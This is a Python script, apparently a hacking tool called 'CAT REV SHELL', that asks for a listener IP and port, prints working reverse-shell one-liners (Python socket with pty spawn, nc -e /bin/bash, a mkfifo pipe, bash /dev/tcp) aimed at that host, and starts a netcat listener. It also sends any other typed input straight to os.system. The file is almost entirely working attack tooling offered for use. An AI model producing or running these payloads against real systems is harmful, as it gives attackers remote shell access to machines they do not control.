#!/usr/bin/env python3
import argparse
import os
import sys
import time
import sys
import readline

os.system("echo ${IFS}")
print("\033[1;31;40m  ___   _ _____   ___ _____   __  ___ _  _ ___ _    _    \033[0m")
print("\033[1;31;40m / __| /_\_   _| | _ \ __\ \ / / / __| || | __| |  | |   \033[0m")
print("\033[1;31;40m| (__ / _ \| |   |   / _| \ V /  \__ \ __ | _|| |__| |__ \033[0m")
print("\033[1;31;40m \___/_/ \_\_|   |_|_\___| \_/   |___/_||_|___|____|____|\033[0m" + " \033[1;33;40mv1.0\033[0m")

def menu1():
	print("")
	print("----------------------------------------------------------------------------")
	print("| command    | interpretation                                               |")
	print("----------------------------------------------------------------------------")
	print("|\033[1;31;40m set ip\033[0m     | Set and change the listening IP and PORT                     |")
	print("|\033[1;31;40m info shell\033[0m | View shell that can be generated                             |")
	print("|\033[1;31;40m set shell\033[0m  | Set the generated shell type                                 |")
	print("|\033[1;31;40m run\033[0m        | Start netcat                                                 |")
	print("----------------------------------------------------------------------------")
	print("")

print("")
print("\033[1;31;40mLHOST:\033[0m ")
print("\033[1;31;40mLPORT:\033[0m ")


os.system("echo ${IFS}")
print("Please enter 'info' to view the command")
def set_up():
	print("")
	print("\033[1;31;40mLHOST:\033[0m " + rev_ip)
	print("\033[1;31;40mLPORT:\033[0m " + rev_port)

	print("")


os.system("echo ${IFS}")

def menu2():
	print("-------------")
	print("| shell     |")
	print("-------------")
	print("|\033[1;31;40m python    \033[0m|")
	print("|\033[1;31;40m python3   \033[0m|")
	print("|\033[1;31;40m nc        \033[0m|")
	print("|\033[1;31;40m mkfifo    \033[0m|")
	print("|\033[1;31;40m bash      \033[0m|")
	print("-------------")
	

def rev_shell():
	if input_shell in('python','python3','nc','mkfifo','bash'):
		if(input_shell == 'python'):
			python = "\033[1;31;40mpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);" + 's.connect(("' + "{}".format(rev_ip) + '",' + "{}".format(rev_port) + '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' + "'\033[0m"
			print("")
			print(python)
			print("")
			
		if(input_shell == 'python3'):
			python3 = "\033[1;31;40mpython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);" + ';s.connect(("' + "{}".format(rev_ip) + '",' + "{}".format(rev_port) + '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' + "'\033[0m"
			print("")
			print(python3)
			print("")
	
		if(input_shell == 'nc'):
			nc = "\033[1;31;40mnc " + "{}".format(rev_ip) + " " + "{}".format(rev_port) +" -e /bin/bash\033[0m"
			print("")
			print(nc)
			print("")
			
		if(input_shell == 'mkfifo'):
			mkfifo = "\033[1;31;40mrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc " + "{}".format(rev_ip) + " " + "{}".format(rev_port) + " >/tmp/f\033[0m"
			print("")
			print(mkfifo)
			print("")
			
		if(input_shell == 'bash'):
			bash = "\033[1;31;40m/bin/bash -i >& /dev/tcp/" + "{}".format(rev_ip) + "/" + "{}".format(rev_port) + " 0>&1\033[0m"
			print("")
			print(bash)
			print("")
	else:
		print("")
		print("no " + input_shell + " shell")
		print("")
			
	
	
start = 0
while start == 0:

	user_input = input('\033[1;31;40m>>>\033[0m ')

	if user_input in ('info','set ip','info shell','set shell','run'):

		if(user_input == 'info'):
			menu1()

		if(user_input == 'set ip'):
			print("")
			rev_ip = input("\033[1;31;40mPlease enter the LHOST>>>\033[0m ")
			rev_port = input("\033[1;31;40mPlease enter the LPORT>>>\033[0m ")
			set_up()
		
		if(user_input == 'info shell'):
			print("")
			menu2()
		
		if(user_input == 'set shell'):
			try:
				print("")
				menu2()
				print("")
				input_shell = input("\033[1;31;40mPlease enter the shell type>>>\033[0m ")
				rev_shell()
			except:
				print("")
				print("\033[1;33;40mPlease run 'set ip'\033[0m")
				print("")
				
		if(user_input == 'run'):
			try:
				
				os.system('\n$(which ncat || which nc) -nlvp ' + rev_port)
			except:
				print("")
				print("\033[1;33;40mPlease run 'set ip'\033[0m")
				print("")
		
	else:
		print("")
		os.system(user_input)
		print("")

